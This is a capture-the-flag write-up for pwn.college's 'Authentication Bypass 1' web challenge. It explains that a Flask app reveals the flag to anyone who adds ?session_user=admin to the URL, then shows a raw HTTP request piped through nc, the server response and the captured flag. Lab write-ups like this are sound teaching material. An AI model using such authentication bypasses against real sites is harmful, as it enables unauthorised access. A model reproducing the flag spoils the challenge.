---
layout: page
title: "Authentication Bypass 1 — Writeup"
summary: "Writeup from Web Security"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Web Security"
date: 2026-04-27
---


## 🧠 Challenge Overview

This challenge provides a Flask-based login system backed by a temporary SQLite database. The goal is to **log in as the `admin` user** and retrieve the flag.

The login form is handled by a `/` POST route that validates credentials against a temporary SQLite database. The database is initialized with:
- an `admin` user with a **random password**
- a `guest` user with password `"password"`

The main logic of concern:
```python
user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
```

---

## Vulnerability

There is no SQL injection, as the query is parameterized.

However, there's a critical GET-based bypass:

In the GET route:

```
@app.route("/", methods=["GET"])
def challenge_get():
    if not (username := flask.request.args.get("session_user", None)):
        ...
    else:
        ...
        if username == "admin":
            page += "<br>Here is your flag: " + open("/flag").read()
```
The page checks for ?session_user=admin in the GET request, and does not validate if the user has logged in.

So simply accessing:
http://challenge.localhost/?session_user=admin
will give us the flag directly without authentication!

---

## Exploit
```bash
hacker@web-security~authentication-bypass-1:~$ printf 'GET /?session_user=admin HTTP/1.0\r\nHost:challenge.localhost\r\n\r\n' | nc challenge.localhost 80
```
###Output:
```bash
HTTP/1.1 200 OK
Server: Werkzeug/3.0.6 Python/3.8.10
Date: Sun, 20 Jul 2025 06:58:33 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 305
Connection: close

<html><body>Hello, admin!<br>Here is your flag: pwn.college{gxy6127uLKDuVTho5_zxjRrNvrl.QX5gzMzwSM0IzMyEzW}
...
```

---
## Flag
```bash
pwn.college{gxy6127uLKDuVTho5_zxjRrNvrl.QX5gzMzwSM0IzMyEzW}
```
---
